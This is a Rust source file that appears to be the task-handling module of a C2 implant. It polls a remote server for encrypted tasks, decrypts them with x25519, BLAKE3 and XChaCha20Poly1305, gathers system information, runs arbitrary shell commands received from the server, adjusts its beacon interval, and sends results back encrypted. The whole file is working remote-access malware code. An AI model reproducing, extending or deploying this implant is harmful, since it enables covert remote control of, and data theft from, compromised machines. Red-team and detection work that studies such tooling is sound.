use arrayvec::ArrayVec;
use base64;
use bincode;
use blake3;
use reqwest;
use std::process;
use std::str::FromStr;
use x25519_dalek::{PublicKey, StaticSecret};

use crate::http::result;
use crate::models::task;
use crate::tasks::{shell, system};
use crate::utils::network_encryption;
use crate::{errors::ImplantError, HOST, PORT, PROTOCOL};

const CHECK_IMPLANT_TASKS_ENDPOINT: &str = "/api/tasks/";

pub fn handle_available_tasks(
    implant_id: &String,
    private_key: &StaticSecret,
    base64_server_public_key: &String,
) -> Result<(bool, u64), ImplantError> {
    let base64_response = get_tasks(&implant_id)?;
    let mut base64_response_lines = base64_response.lines();

    // Using unwrap is safe here, because we control the response from server
    // and it is known to the creator
    let base64_encrypted_tasks = base64_response_lines.next().unwrap();
    let base64_nonce = base64_response_lines.next().unwrap();

    // Convert and decrypt tasks response
    // Base64 decode
    let available_tasks_encrypted = base64::decode(base64_encrypted_tasks)?;

    // Convert public key from base64 to [u8, 32] and nonce from base64 to [u8; 24]
    let server_public_key_vec = base64::decode(base64_server_public_key)?;
    let server_public_key_bytes: ArrayVec<u8, 32> = server_public_key_vec.into_iter().collect();
    let server_public_key_bytes = server_public_key_bytes.into_inner()?;

    let nonce_vec = base64::decode(base64_nonce)?;
    let nonce_bytes: ArrayVec<u8, 24> = nonce_vec.into_iter().collect();
    let nonce_bytes = nonce_bytes.into_inner()?;

    // Generate x25519 shared secret
    let server_public_key = PublicKey::from(server_public_key_bytes);
    let x25519_shared_secret =
        network_encryption::generate_shared_secret(private_key, server_public_key);

    // Generate BLAKE3 hashed key
    let blake3_hashed_key = network_encryption::blake3_hash_key(x25519_shared_secret.as_bytes());

    // Decrypt tasks response
    let decrypted_tasks_response = network_encryption::xchacha20poly1305_decrypt_message(
        blake3_hashed_key,
        available_tasks_encrypted,
        nonce_bytes,
    );

    // Deserialize tasks response
    let deserialized_tasks: Vec<task::Task> = bincode::deserialize(&decrypted_tasks_response[..])?;

    // Check if tasks response is empty array
    if deserialized_tasks.is_empty() {
        return Ok((true, 60));
    }

    for task in deserialized_tasks {
        // Using unwrap is safe here because task is sent from server
        let task_enum = task::Tasks::from_str(task.task.as_str()).unwrap();
        match task_enum {
            task::Tasks::GetInfo => {
                let system_info = system::gather_system_info(&implant_id)?;

                // Encrypt and send system_info
                let task_id = task.task_id.to_string();
                let encrypted_response =
                    build_encrypted_response(&blake3_hashed_key, system_info, implant_id);
                result::send_task(&task_id, encrypted_response)?;
            }
            task::Tasks::Command => {
                if let Some(command_value) = task.value {
                    let stdout = shell::execute_command(command_value)?;

                    // Encrypt and send system_info
                    let task_id = task.task_id.to_string();
                    let encrypted_response =
                        build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
                    result::send_task(&task_id, encrypted_response)?;
                } else {
                    let stdout = "Missing arguments".to_owned().into_bytes();

                    // Encrypt and send system_info
                    let task_id = task.task_id.to_string();
                    let encrypted_response =
                        build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
                    result::send_task(&task_id, encrypted_response)?;
                }
            }
            task::Tasks::ChangeCheckIn => {
                if let Some(new_check_in) = task.value {
                    let new_check_in_res = new_check_in.parse::<u64>();

                    match new_check_in_res {
                        Ok(new_check_in) => {
                            let stdout = format!(
                                "{}:{}",
                                "Successfully changed check in time to", new_check_in
                            )
                            .into_bytes();

                            // Encrypt and send system_info
                            let task_id = task.task_id.to_string();
                            let encrypted_response =
                                build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
                            result::send_task(&task_id, encrypted_response)?;

                            return Ok((false, new_check_in));
                        }
                        Err(error) => {
                            let stdout = error.to_string().into_bytes();

                            // Encrypt and send system_info
                            let task_id = task.task_id.to_string();
                            let encrypted_response =
                                build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
                            result::send_task(&task_id, encrypted_response)?;
                        }
                    }
                } else {
                    let stdout = "Missing arguments".to_owned().into_bytes();

                    // Encrypt and send system_info
                    let task_id = task.task_id.to_string();
                    let encrypted_response =
                        build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
                    result::send_task(&task_id, encrypted_response)?;
                }
            }
            _ => process::exit(1),
        }
    }

    Ok((true, 60))
}

pub fn get_tasks(implant_id: &String) -> Result<String, ImplantError> {
    let full_url = format!(
        "{}://{}:{}{}{}",
        PROTOCOL, HOST, PORT, CHECK_IMPLANT_TASKS_ENDPOINT, implant_id
    );

    let response = reqwest::blocking::get(full_url)?.text()?;

    Ok(response)
}

// There is no reason to generate keypair again
// because private key and public key are same,
// so BLAKE3 hash will be same.
// However, XChaCha20Poly1305 adds random nonce, which guarantees
// that response will be different.
pub fn build_encrypted_response<T>(
    blake3_hashed_key: &blake3::Hash,
    message: T,
    implant_id: &str,
) -> String
where
    T: Sized + serde::Serialize,
{
    // Encrypt message (XChaCha20Poly1305)
    let encoded_message = bincode::serialize(&message).expect("Vector encode error");
    let (encrypted_message, nonce) =
        network_encryption::xchacha20poly1305_encrypt_message(blake3_hashed_key, &encoded_message);

    // Base64 encode encrypted response byte array
    let base64_encrypted_message = base64::encode(encrypted_message);

    // Base64 encode nonce
    let base64_nonce = base64::encode(nonce);

    let response = format!(
        "{}\n{}\n{}",
        base64_encrypted_message, base64_nonce, implant_id
    );

    response
}
